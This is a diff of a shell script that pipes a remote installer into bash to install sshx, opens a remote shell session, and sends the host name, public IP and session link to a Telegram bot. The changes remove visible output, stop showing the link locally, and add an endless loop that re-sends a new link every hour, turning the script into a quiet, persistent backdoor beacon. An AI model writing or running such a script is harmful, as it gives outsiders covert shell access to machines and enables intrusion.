@@ -10,8 +10,7 @@ curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
 -d "parse_mode=HTML" > /dev/null
 }
 
-echo "[STEP] Detect OS"
-
+# Detect OS
 if [ -f /etc/os-release ]; then
 . /etc/os-release
 OS=$ID
@@ -36,30 +35,28 @@ INSTALL="apt-get install -y"
 ;;
 esac
 
-echo "[STEP] Install dependencies"
-
 $UPDATE
 
 command -v curl >/dev/null || $INSTALL curl
-command -v tmux >/dev/null || $INSTALL tmux
 command -v grep >/dev/null || $INSTALL grep
 
 if ! command -v sshx >/dev/null; then
-echo "[STEP] Install sshx"
 curl -fsSL https://sshx.io/get | bash
 fi
 
 export PATH=$PATH:$HOME/.sshx/bin
 
+while true
+do
+
 HOST=$(hostname)
 IP=$(curl -s ifconfig.me)
 TIME=$(date)
 
-echo "[STEP] Starting sshx..."
-
+# jalankan sshx
 sshx > /tmp/sshx.log 2>&1 &
 
-sleep 5
+sleep 6
 
 LINK=$(grep -o 'https://sshx.io/s/[^ ]*' /tmp/sshx.log | head -1)
 
@@ -74,5 +71,6 @@ sshx v0.4.1
 
 send "$MSG"
 
-echo "[INFO] SSHX LINK:"
-echo "$LINK"
+sleep 3600
+
+done
